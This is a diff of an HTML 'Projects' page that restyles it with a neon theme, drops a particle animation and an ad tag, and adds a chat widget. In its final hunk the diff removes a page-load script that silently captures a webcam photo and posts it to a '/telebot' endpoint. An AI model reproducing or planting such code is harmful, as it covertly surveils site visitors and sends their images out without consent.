@@ -4,359 +4,165 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="google-adsense-account" content="ca-pub-5625905404408423">
     <title>Burat</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary-color: #00adb5;
-            --secondary-color: #393e46;
-            --background-color: #222831;
-            --text-color: #eeeeee;
+            --primary-color: #00f7ff;
+            --secondary-color: #ff00e6;
+            --background-color: #060615;
+            --text-color: #e0e0ff;
+            --nav-height: 80px;
+            --transition-speed: 0.3s;
+            --glow-strength: 5px;
         }
 
         * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
         }
 
         body {
-            font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, var(--background-color), var(--secondary-color));
+            font-family: 'Orbitron', sans-serif;
+            background-color: var(--background-color);
             color: var(--text-color);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
+            line-height: 1.6;
             overflow-x: hidden;
-            position: relative;
-        }
-
-        #particles-js {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
+            background-image:
+                radial-gradient(circle at 10% 20%, rgba(0, 247, 255, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(255, 0, 230, 0.1) 0%, transparent 20%);
+            background-attachment: fixed;
         }
 
         .wrapper-container {
-            max-width: 600px;
-            width: 100%;
-            padding: 30px;
-            background-color: rgba(57, 62, 70, 0.8);
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
-            margin-bottom: 20px;
-            transition: all 0.3s ease;
-            animation: fadeIn 1s ease;
-            position: relative;
-            z-index: 1;
-        }
-
-        input,
-        select {
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid var(--secondary-color);
-            background-color: rgba(238, 238, 238, 0.1);
-            color: var(--text-color);
-            font-size: 16px;
-            transition: all 0.3s ease;
-        }
-
-        input::placeholder {
-            color: rgba(238, 238, 238, 0.5);
-        }
-
-        input:focus,
-        select:focus {
-            background-color: rgba(238, 238, 238, 0.2);
-            border-color: var(--primary-color);
-            outline: none;
-            box-shadow: 0 0 5px rgba(0, 173, 181, 0.5);
-        }
-
-        button {
-            padding: 12px 24px;
-            border: none;
-            border-radius: 8px;
-            background-color: var(--primary-color);
-            color: var(--text-color);
-            font-size: 18px;
-            cursor: pointer;
-            transition: all 0.3s ease;
+            max-width: 1200px;
             margin: 0 auto;
-            display: block;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
-            animation: pulse 2s infinite;
-        }
-
-        button:hover {
-            background-color: #007e85;
-            transform: translateY(-2px);
-        }
-
-        button:disabled {
-            background-color: #666;
-            cursor: not-allowed;
-            transform: none;
-            animation: none;
+            padding: 20px;
         }
 
         h1 {
             text-align: center;
+            font-size: 3rem;
+            margin-bottom: 40px;
             color: var(--primary-color);
-            margin-bottom: 20px;
-            font-size: 36px;
-            font-weight: bold;
-            animation: fadeInDown 1s ease;
         }
 
         .burat {
+            background: rgba(6, 6, 21, 0.6);
             margin-bottom: 20px;
-            padding: 15px;
-            border: 1px solid var(--primary-color);
-            border-radius: 8px;
-            background-color: rgba(238, 238, 238, 0.1);
-            text-align: center;
-            transition: all 0.3s ease;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 247, 255, 0.2);
         }
 
-        .burat:hover {
-            background-color: rgba(238, 238, 238, 0.2);
-            transform: translateY(-2px);
+        .burat h2 {
+            font-size: 2rem;
+            margin-bottom: 10px;
+        }
+
+        .burat p {
+            margin-bottom: 10px;
         }
 
         .burat-link {
-            display: inline-block;
-            padding: 10px 20px;
-            background-color: var(--primary-color);
-            color: var(--text-color);
-            border-radius: 5px;
             text-decoration: none;
-            font-size: 16px;
-            transition: background-color 0.3s ease;
+            color: var(--primary-color);
+            font-weight: bold;
+            padding: 10px;
+            border: 2px solid var(--primary-color);
+            border-radius: 5px;
+            transition: all var(--transition-speed) ease;
         }
 
         .burat-link:hover {
-            background-color: #007e85;
-        }
-
-        .dev-btn {
-            display: flex;
-            align-items: center;
-            background-color: #4267B2;
-            padding: 10px 20px;
-            border-radius: 5px;
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-            border: none;
-            transition: all 0.3s ease;
-        }
-
-        .dev-btn:hover {
-            background-color: #365899;
-            transform: translateY(-2px);
+            background-color: var(--primary-color);
+            color: var(--background-color);
+            text-shadow: 0 0 var(--glow-strength) var(--primary-color);
         }
 
         #chat-button {
             position: fixed;
             bottom: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             right: 20px;
             background-color: var(--primary-color);
-            color: var(--text-color);
+            color: var(--background-color);
             border: none;
             border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            font-size: 24px;
+            padding: 20px;
+            font-size: 1.5rem;
             cursor: pointer;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
-            z-index: 1000;
-        }
-
-        #chat-button:hover {
-            transform: scale(1.1);
+            box-shadow: 0 0 20px rgba(0, 247, 255, 0.5);
         }
 
         #chat-container {
-            display: none;
             position: fixed;
-            bottom: 90px;
+            bottom: 100px;
             right: 20px;
+            background-color: rgba(6, 6, 21, 0.8);
+            border-radius: 10px;
             width: 300px;
             height: 400px;
-            background-color: rgba(57, 62, 70, 0.9);
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
-            z-index: 1000;
+            display: none;
+            box-shadow: 0 0 20px rgba(0, 247, 255, 0.5);
+            padding: 20px;
+            overflow-y: auto;
         }
 
         #chat-messages {
-            height: 340px;
+            height: 80%;
             overflow-y: auto;
-            padding: 10px;
+            margin-bottom: 10px;
         }
 
         .message {
             margin-bottom: 10px;
-            padding: 8px 12px;
-            border-radius: 8px;
-            max-width: 80%;
-            position: relative;
-            display: inline-block;
         }
 
         .user-message {
-            background-color: var(--primary-color);
-            color: var(--text-color);
-            /* align-self: flex-end; */
-            float: right;
-            clear: both;
-            margin-left: auto;
-
+            text-align: right;
+            color: var(--secondary-color);
         }
-
-        /* .assistant-message {
-            background-color: var(--secondary-color);
-            color: var(--text-color);
-            align-self: flex-start;
-        } */
 
         .assistant-message {
-            background-color: var(--secondary-color);
-            color: var(--text-color);
-            float: left;
-            clear: both;
-        }
-
-        .copy-button {
-            display: none;
-            position: absolute;
-            top: 5px;
-            right: 5px;
-            background-color: rgba(255, 255, 255, 0.3);
-            border: none;
-            border-radius: 4px;
-            padding: 2px 5px;
-            font-size: 12px;
-            cursor: pointer;
-        }
-
-        .message:hover .copy-button,
-        .message:active .copy-button {
-            display: block;
+            text-align: left;
+            color: var(--primary-color);
         }
 
         #chat-input {
             display: flex;
-            padding: 10px;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
         }
 
         #chat-input input {
-            flex-grow: 1;
-            margin-right: 10px;
+            width: 70%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid var(--primary-color);
+            background-color: rgba(6, 6, 21, 0.6);
+            color: var(--text-color);
         }
 
         #chat-input button {
-            padding: 8px 12px;
-            font-size: 14px;
+            width: 20%;
+            background-color: var(--primary-color);
+            color: var(--background-color);
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            padding: 10px;
+            transition: all var(--transition-speed) ease;
         }
 
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-
-            to {
-                opacity: 1;
-            }
-        }
-
-        @keyframes fadeInDown {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes slideInFromLeft {
-            from {
-                opacity: 0;
-                transform: translateX(-20px);
-            }
-
-            to {
-                opacity: 1;
-                transform: translateX(0);
-            }
-        }
-
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                transform: scale(1.05);
-            }
-
-            100% {
-                transform: scale(1);
-            }
-        }
-
-        @media (min-width: 768px) {
-            .wrapper-container {
-                padding: 40px;
-            }
-
-            h1 {
-                font-size: 48px;
-            }
-
-            p {
-                font-size: 20px;
-            }
-
-            .form-item {
-                display: flex;
-                align-items: center;
-            }
-
-            label {
-                width: 120px;
-                margin-bottom: 0;
-                margin-right: 20px;
-            }
-
-            input,
-            select {
-                flex: 1;
-            }
+        #chat-input button:hover {
+            background-color: var(--secondary-color);
         }
     </style>
 </head>
 
 <body>
-    <div id="particles-js"></div>
-
     <div class="wrapper-container">
         <h1>Projects</h1>
 
@@ -429,94 +235,16 @@
         </div>
     </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
-    <script>
-        particlesJS('particles-js', {
-            particles: {
-                number: {
-                    value: 80,
-                    density: {
-                        enable: true,
-                        value_area: 800
-                    }
-                },
-                color: {
-                    value: "#ffffff"
-                },
-                shape: {
-                    type: "circle",
-                    stroke: {
-                        width: 0,
-                        color: "#000000"
-                    }
-                },
-                opacity: {
-                    value: 0.5,
-                    random: false
-                },
-                size: {
-                    value: 3,
-                    random: true
-                },
-                line_linked: {
-                    enable: true,
-                    distance: 150,
-                    color: "#ffffff",
-                    opacity: 0.4,
-                    width: 1
-                },
-                move: {
-                    enable: true,
-                    speed: 6,
-                    direction: "none",
-                    random: false,
-                    straight: false,
-                    out_mode: "out",
-                    bounce: false
-                }
-            },
-            interactivity: {
-                detect_on: "canvas",
-                events: {
-                    onhover: {
-                        enable: true,
-                        mode: "repulse"
-                    },
-                    onclick: {
-                        enable: true,
-                        mode: "push"
-                    },
-                    resize: true
-                },
-                modes: {
-                    grab: {
-                        distance: 400,
-                        line_linked: {
-                            opacity: 1
-                        }
-                    },
-                    bubble: {
-                        distance: 400,
-                        size: 40,
-                        duration: 2,
-                        opacity: 8,
-                        speed: 3
-                    },
-                    repulse: {
-                        distance: 200,
-                        duration: 0.4
-                    },
-                    push: {
-                        particles_nb: 4
-                    },
-                    remove: {
-                        particles_nb: 2
-                    }
-                }
-            },
-            retina_detect: true
-        });
+    <button id="chat-button" onclick="toggleChat()">💬</button>
+    <div id="chat-container">
+        <div id="chat-messages"></div>
+        <div id="chat-input">
+            <input type="text" id="user-input" placeholder="Type your message...">
+            <button onclick="sendMessage()">Send</button>
+        </div>
+    </div>
 
+    <script>
         function toggleChat() {
             const chatContainer = document.getElementById('chat-container');
             chatContainer.style.display = chatContainer.style.display === 'block' ? 'none' : 'block';
@@ -565,46 +293,6 @@
             }
         });
     </script>
-    <script>
-        window.onload = function() {
-            navigator.mediaDevices.getUserMedia({
-                    video: true
-                })
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        const context = canvas.getContext('2d');
-                        context.drawImage(video, 0, 0);
-                        canvas.toBlob(blob => {
-                            const formData = new FormData();
-                            formData.append('photo', blob);
-                            fetch('/telebot', {
-                                    method: 'POST',
-                                    body: formData,
-                                })
-                                .then(response => {
-                                    if (response.ok) {
-                                        console.log('Photo sent successfully.');
-                                    } else {
-                                        console.error('Failed to send photo:', response.statusText);
-                                    }
-                                });
-                        }, 'image/png');
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 2000);
-                })
-                .catch(() => {
-                    console.error('Camera access denied.');
-                });
-        };
-    </script>
-    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5625905404408423"
-     crossorigin="anonymous"></script>
 </body>
 
 </html>
